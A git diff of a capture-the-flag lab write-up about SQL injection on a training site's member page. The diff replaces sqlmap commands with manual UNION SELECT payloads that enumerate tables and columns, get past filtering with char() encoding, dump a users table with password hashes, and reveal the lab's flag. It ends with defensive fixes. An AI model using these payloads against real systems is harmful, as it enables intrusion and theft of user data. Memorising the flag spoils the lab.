@@ -1,4 +1,4 @@
-# SQL injection
+# SQL Injection
 The member page [http://10.203.72.119/?page=member](http://10.203.72.119/?page=member "member page") is vunerable to ***sql injection***
 
 ## Method
@@ -8,68 +8,67 @@ If we submit a ***'*** as the member id
 
 *'' You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1 ''*
 
-We can then use ***sqlmap***, which with this command.
-``` bash
-sqlmap -u '10.203.72.119/?page=members&id=1'
-```
-We then discover that we have differnt types of sql injections that can be used to penetrate this web application, types listed as follows
-1. Boolean-based blind sql
-1. Error-based
-1. Time-based blind
-1. Union query
+This is error displays for both single and double qoutes, which we now understand that they dont use neither to begin and end their statements.
 
-Futhering this process we then check the names of the databases they have, achived using the command
-```bash
-sqlmap -u '10.203.72.119/?page=members&id=1' --dbs
+We can now get all the rows in this table with input ***1 or 1***.
 ```
-We then get the following output
-```bash
-[03:54:15] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL >= 5.5
-[03:54:15] [INFO] fetching database names
-available databases [6]:
-[*] information_schema
-[*] Member_Brute_Force
-[*] Member_guestbook
-[*] Member_images
-[*] Member_Sql_Injection
-[*] Member_survey
+http://10.203.73.150/index.php?page=member&id=1+or+1&Submit=Submit#
 ```
-Or we can use the command below to get a detailed database and its tables.
-``` bash
-sqlmap -u '10.203.72.119/?page=members&id=1' -tables
+we get 4 rows back. the fourth one has a clue, as shown below.
 ```
-Which will show us that there is a table named users, and this is were all the passwords are. Below is the output for this command where we find the 
-```bash
-Database: Member_Sql_Injection
-[1 table]
-+---------------------------------------+
-| users                                 |
-+---------------------------------------+
+ID: 1 or 1 
+First name: Flag
+Surname : GetThe
 ```
-We then look futher in the users table, to see some sensitive information, we use following command to ***dump*** the table to see whats in it.
-``` bash
-sqlmap -u '10.203.72.119/?page=members&id=1' -T users --dump
-```
-results
 
-``` bash
-Database: Member_Sql_Injection
-Table: users
-[4 entries]
-+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+----------------------------------+
-| user_id | town      | planet | country   | last_name | first_name     | Commentaire                                                                   | countersign                      |
-+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+----------------------------------+
-| 1       | Honolulu  | EARTH  | America   | Obama     | Barack Hussein | Amerca !                                                                      | 2b3366bcfd44f540e630d4dc2b9b06d9 |
-| 2       | Berlin    | Earth  | Allemagne | Hitler    | Adolf          | Ich spreche kein Deutsch.                                                     | 60e9032c586fb422e2c16dee6286cf10 |
-| 3       | Moscou    | Earth  | Russia    | Staline   | Joseph         | ????? ????????????? ?????????                                                 | e083b24a01c483437bcf4a9eea7c1b4d |
-| 5       | 42        | 42     | 42        | GetThe    | Flag           | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |
-+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+----------------------------------+
-```
-We then follow the instructions to decrypt the password, which decrypts to ***FortyTwo***, then lower all characters to ***fortytwo***. Then converted to sh256 will result to ***10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5*** which is the flag
+So there is a flag in this table probably. Ok, so then we check for the tables that they have from the information schema. Using union select, we select all the tables, as shown below.
 
-## Solutions
+``` sql
+1 union select 1, table_name from information_schema.tables
+```
+output
+```
+ID: 1 union select 1, table_name from information_schema.tables-- 
+First name: 1
+Surname : users
+ID: 1 union select 1, table_name from information_schema.tables-- 
+First name: 1
+Surname : guestbook
+ID: 1 union select 1, table_name from information_schema.tables-- 
+First name: 1
+Surname : list_images
+ID: 1 union select 1, table_name from information_schema.tables-- 
+First name: 1
+Surname : vote_dbs
+```
+These are the are some of table that we got back, but the above seem to be ones that are used for users of this web application. We first look into the ***users*** table. With the sql statement below we will display all the columns for this table.
+```sql
+1 union select 1, column_name from information_schema.columns where table_name=char(117,115,101,114,115)
+```
+For the name of the table we are selecting the columns from which is the ***users***  table, on the input we had to convert ***users*** to ascii (117,115,101,114,115), it seems like the are using a php function to protect against this input.
+
+From the output we get colunms:
+1. first_name
+1. last_name
+1. town
+1. country
+1. planet
+1. commentaire
+1. countersign
+
+Lets get the rows for the columns with sql below
+``` sql
+1 union select 1, concat(first_name, last_name, town,country, planet,commentaire, countersign) from users
+```
+On the last row return from the output we then get instructions to the flag
+```
+ID: 1 union select 1, concat(first_name, last_name, town,country, planet,commentaire, countersign) from users 
+First name: 1
+Surname : FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
+```
+We folow the instructions to get this flag ***10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5***.
+
+## Soultion
 1. Using prepared statements given that this site uses ***PHP***, prepared help the database distinguish between the ***code*** and ***user input***, by pre-compliling ***SQL*** statements to be then used as input. For ***PHP*** using ***PDO*** is one of the solutions.
 1. Validating input, making use of ***regular expression*** to validate thee user input whether it matches the expected input, checking whether it contains special charcters, which would be incorrect if the input is to be a surname or name. This process can be called ***sanitization***.
 1. ***Backend*** validation is very important.
-
